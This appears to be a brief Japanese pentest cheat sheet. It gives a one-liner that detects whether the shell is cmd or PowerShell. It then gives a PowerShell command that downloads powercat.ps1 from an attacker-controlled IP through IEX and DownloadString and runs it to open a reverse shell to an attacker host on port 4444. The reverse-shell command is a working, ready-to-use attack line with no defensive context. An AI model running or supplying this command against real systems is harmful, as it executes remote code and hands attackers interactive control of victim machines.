## 現在の実行環境がコマンドプロンプトかPowerShellかをチェック
```.ps1
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

## 攻撃者のマシンからリバースシェルのスクリプトをダウンロードして実行する
```.ps1
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c <attacker IP> -p 4444 -e powershell
```